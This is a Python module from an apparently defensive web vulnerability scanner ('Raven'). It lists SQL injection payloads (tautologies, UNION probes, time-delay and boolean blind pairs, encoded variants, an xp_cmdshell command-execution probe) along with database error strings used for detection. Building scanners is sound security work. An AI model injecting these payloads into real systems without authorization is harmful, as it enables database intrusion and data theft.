"""
web/payloads/sqli.py
--------------------
SQL injection payload library for Raven Phase 8 active web scanning.

Covers:
  - Error-based detection (MySQL, PostgreSQL, MSSQL, SQLite, Oracle)
  - Boolean-based blind (true/false condition injection)
  - Time-based blind (WAITFOR / SLEEP / pg_sleep)
  - UNION-based extraction starters
  - URL-encoded and double-encoded variants
  - Out-of-band starters (DNS — passive indicator only)

Expected indicators by technique:
  Error-based:  known DBMS error string fragments in response body
  Boolean-based: response length or content differs between true/false pair
  Time-based:   response delay >= 5 seconds (TIME_DELAY:5 convention)
  UNION:        'NULL' appears in an unexpected column position

NOTE: Boolean-based and time-based confirmations ALWAYS go through the AI
      advisor for a second opinion — they are never auto-confirmed by string
      match alone due to high false-positive risk.
"""

from __future__ import annotations

from web.payloads import PayloadContext

# ── Raw payload strings ────────────────────────────────────────────────────────

PAYLOADS: list[str] = [
    # ── Error-based — single-quote and comment terminators ────────────────────
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "' OR 1=1#",
    "'; SELECT 1--",
    "'; SELECT 1,2,3--",
    # ── UNION-based starters (MySQL / generic) ─────────────────────────────────
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL--",
    # ── MSSQL specific ────────────────────────────────────────────────────────
    "'; EXEC xp_cmdshell('ping 127.0.0.1')--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    # ── PostgreSQL specific ────────────────────────────────────────────────────
    "'; SELECT pg_sleep(5)--",
    "' AND 1=CAST((SELECT version()) AS int)--",
    # ── MySQL specific ────────────────────────────────────────────────────────
    "' AND SLEEP(5)--",
    "' AND 1=1 AND SLEEP(5)--",
    "'; SELECT SLEEP(5)--",
    # ── SQLite specific ───────────────────────────────────────────────────────
    "' AND 1=1--",
    "' AND 1=2--",
    # ── Boolean blind pair ────────────────────────────────────────────────────
    "' AND '1'='1",
    "' AND '1'='2",
    # ── MSSQL time-based ──────────────────────────────────────────────────────
    "'; WAITFOR DELAY '0:0:5'--",
    "1; WAITFOR DELAY '0:0:5'--",
    # ── Oracle ────────────────────────────────────────────────────────────────
    "' OR 1=1--",
    "' AND ROWNUM=1--",
    # ── URL-encoded variants ──────────────────────────────────────────────────
    "%27 OR %271%27=%271",
    "%27 OR 1=1--",
    # ── Double-encoded ────────────────────────────────────────────────────────
    "%2527 OR %25271%2527=%25271",
]

# ── Error-string indicators (error-based detection) ───────────────────────────

#: If any of these strings appear in the response body (case-insensitive),
#: the response strongly suggests a SQL error was triggered.
ERROR_INDICATORS: list[str] = [
    # MySQL
    "sql syntax",
    "mysql_fetch",
    "mysql_num_rows",
    "you have an error in your sql",
    "warning: mysql",
    "supplied argument is not a valid mysql",
    "column count doesn't match",
    "the used select statements have a different number of columns",
    "mysql_query",
    # Oracle
    "ora-",
    "oci_",
    # PostgreSQL
    "pg_query",
    "pg_exec",
    "syntax error at or near",
    "invalid input syntax for",
    "unterminated quoted string",
    # SQLite
    "sqlite_",
    "sqlite3.",
    'near "": syntax error',
    "unrecognized token",
    # MSSQL
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "odbc driver",
    "microsoft ole db provider",
    "[microsoft][odbc",
    "sqlstate",
    # DB2
    "db2 sql error",
    # Generic / framework-level
    "syntax error",
    "invalid query",
    "division by zero",
    "query failed",
    "database error",
    "unexpected end of sql",
    "sql command not properly ended",
    "invalid column name",
    "unknown column",
    "operand should contain",
    "error in your sql syntax",
    "sqlexception",
    "jdbc",
    "hibernate",
    "datamapper",
    "sequelize",
    "activerecord",
    "knex",
    "prisma",
]

# ── Rich payload metadata ──────────────────────────────────────────────────────

CONTEXTS: list[PayloadContext] = [
    PayloadContext(
        payload="'",
        injection_type="query_param",
        expected_indicator="sql syntax",
        severity="High",
        vuln_type="SQLi",
    ),
    PayloadContext(
        payload="' OR '1'='1",
        injection_type="query_param",
        expected_indicator="sql syntax",
        severity="Critical",
        vuln_type="SQLi",
    ),
    PayloadContext(
        payload="' OR 1=1--",
        injection_type="query_param",
        expected_indicator="sql syntax",
        severity="Critical",
        vuln_type="SQLi",
    ),
    PayloadContext(
        payload="' UNION SELECT NULL--",
        injection_type="query_param",
        expected_indicator="column count doesn't match",
        severity="Critical",
        vuln_type="SQLi",
    ),
    PayloadContext(
        payload="'; SELECT SLEEP(5)--",
        injection_type="query_param",
        expected_indicator="TIME_DELAY:5",
        severity="Critical",
        vuln_type="SQLi",
    ),
    PayloadContext(
        payload="'; WAITFOR DELAY '0:0:5'--",
        injection_type="query_param",
        expected_indicator="TIME_DELAY:5",
        severity="Critical",
        vuln_type="SQLi",
    ),
    PayloadContext(
        payload="'; SELECT pg_sleep(5)--",
        injection_type="query_param",
        expected_indicator="TIME_DELAY:5",
        severity="Critical",
        vuln_type="SQLi",
    ),
    PayloadContext(
        payload="' AND '1'='1",
        injection_type="query_param",
        expected_indicator="BOOLEAN_TRUE",
        severity="High",
        vuln_type="SQLi",
    ),
    PayloadContext(
        payload="' AND '1'='2",
        injection_type="query_param",
        expected_indicator="BOOLEAN_FALSE",
        severity="High",
        vuln_type="SQLi",
    ),
    PayloadContext(
        payload="%27 OR %271%27=%271",
        injection_type="query_param",
        expected_indicator="sql syntax",
        severity="High",
        vuln_type="SQLi",
    ),
]
